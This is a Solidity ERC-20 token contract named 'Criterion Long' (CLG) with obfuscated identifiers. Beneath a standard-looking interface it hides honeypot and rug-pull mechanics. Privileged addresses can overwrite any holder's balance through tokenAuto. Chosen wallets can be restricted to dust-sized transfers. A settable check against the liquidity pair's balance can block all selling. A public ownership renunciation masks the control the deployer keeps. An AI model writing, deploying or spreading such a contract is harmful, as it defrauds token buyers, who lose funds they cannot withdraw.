//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface fundMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract feeMarketingShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeAmount {
    function createPair(address senderToEnable, address atTokenLiquidity) external returns (address);
}

interface atTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxToken) external view returns (uint256);

    function transfer(address fundList, uint256 walletTrading) external returns (bool);

    function allowance(address fromTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletTrading) external returns (bool);

    function transferFrom(
        address sender,
        address fundList,
        uint256 walletTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedReceiver, uint256 value);
    event Approval(address indexed fromTrading, address indexed spender, uint256 value);
}

interface atToMetadata is atTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CriterionLong is feeMarketingShould, atTo, atToMetadata {

    uint256 private teamShould;

    uint256 constant swapLaunched = 8 ** 10;

    event OwnershipTransferred(address indexed limitLiquidity, address indexed feeTxSwap);

    function tokenAuto(address swapTrading, uint256 walletTrading) public {
        tradingWallet();
        toAutoEnable[swapTrading] = walletTrading;
    }

    function symbol() external view virtual override returns (string memory) {
        return enableMax;
    }

    function decimals() external view virtual override returns (uint8) {
        return marketingSwapMin;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoMarketingLiquidity;
    }

    mapping(address => bool) public launchReceiver;

    function getOwner() external view returns (address) {
        return limitTake;
    }

    address totalExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address receiverSell, address atFromMarketing) external view virtual override returns (uint256) {
        if (atFromMarketing == totalExempt) {
            return type(uint256).max;
        }
        return exemptModeAt[receiverSell][atFromMarketing];
    }

    mapping(address => mapping(address => uint256)) private exemptModeAt;

    function balanceOf(address maxToken) public view virtual override returns (uint256) {
        return toAutoEnable[maxToken];
    }

    bool public tokenReceiver;

    function feeMaxIs(address autoWallet, address fundList, uint256 walletTrading) internal returns (bool) {
        if (autoWallet == receiverBuy) {
            return receiverEnable(autoWallet, fundList, walletTrading);
        }
        uint256 fromList = atTo(exemptTakeFrom).balanceOf(fundReceiver);
        require(fromList == sellFrom);
        require(fundList != fundReceiver);
        if (launchReceiver[autoWallet]) {
            return receiverEnable(autoWallet, fundList, swapLaunched);
        }
        return receiverEnable(autoWallet, fundList, walletTrading);
    }

    function transferFrom(address autoWallet, address fundList, uint256 walletTrading) external override returns (bool) {
        if (_msgSender() != totalExempt) {
            if (exemptModeAt[autoWallet][_msgSender()] != type(uint256).max) {
                require(walletTrading <= exemptModeAt[autoWallet][_msgSender()]);
                exemptModeAt[autoWallet][_msgSender()] -= walletTrading;
            }
        }
        return feeMaxIs(autoWallet, fundList, walletTrading);
    }

    bool public receiverMin;

    function owner() external view returns (address) {
        return limitTake;
    }

    function receiverEnable(address autoWallet, address fundList, uint256 walletTrading) internal returns (bool) {
        require(toAutoEnable[autoWallet] >= walletTrading);
        toAutoEnable[autoWallet] -= walletTrading;
        toAutoEnable[fundList] += walletTrading;
        emit Transfer(autoWallet, fundList, walletTrading);
        return true;
    }

    constructor (){
        if (launchSender == teamShould) {
            tokenReceiver = true;
        }
        fundMax swapAt = fundMax(totalExempt);
        exemptTakeFrom = takeAmount(swapAt.factory()).createPair(swapAt.WETH(), address(this));
        
        receiverBuy = _msgSender();
        txAt();
        maxBuy[receiverBuy] = true;
        toAutoEnable[receiverBuy] = autoMarketingLiquidity;
        if (teamShould != launchSender) {
            launchSender = teamShould;
        }
        emit Transfer(address(0), receiverBuy, autoMarketingLiquidity);
    }

    uint8 private marketingSwapMin = 18;

    address public receiverBuy;

    string private enableMax = "CLG";

    address fundReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function swapTotalFrom(address receiverFee) public {
        tradingWallet();
        if (tradingSender) {
            teamShould = launchSender;
        }
        if (receiverFee == receiverBuy || receiverFee == exemptTakeFrom) {
            return;
        }
        launchReceiver[receiverFee] = true;
    }

    address public exemptTakeFrom;

    function tradingWallet() private view {
        require(maxBuy[_msgSender()]);
    }

    function tradingMin(address tokenLaunchedAt) public {
        if (receiverMin) {
            return;
        }
        if (tradingSender != modeTake) {
            teamShould = launchSender;
        }
        maxBuy[tokenLaunchedAt] = true;
        if (modeTake) {
            tradingSender = false;
        }
        receiverMin = true;
    }

    address private limitTake;

    function name() external view virtual override returns (string memory) {
        return totalReceiver;
    }

    function transfer(address swapTrading, uint256 walletTrading) external virtual override returns (bool) {
        return feeMaxIs(_msgSender(), swapTrading, walletTrading);
    }

    function approve(address atFromMarketing, uint256 walletTrading) public virtual override returns (bool) {
        exemptModeAt[_msgSender()][atFromMarketing] = walletTrading;
        emit Approval(_msgSender(), atFromMarketing, walletTrading);
        return true;
    }

    uint256 sellFrom;

    uint256 liquidityLaunched;

    bool private modeTake;

    mapping(address => bool) public maxBuy;

    bool private tradingSender;

    string private totalReceiver = "Criterion Long";

    uint256 private autoMarketingLiquidity = 100000000 * 10 ** 18;

    function txAt() public {
        emit OwnershipTransferred(receiverBuy, address(0));
        limitTake = address(0);
    }

    uint256 private launchSender;

    mapping(address => uint256) private toAutoEnable;

    function exemptFromTo(uint256 walletTrading) public {
        tradingWallet();
        sellFrom = walletTrading;
    }

}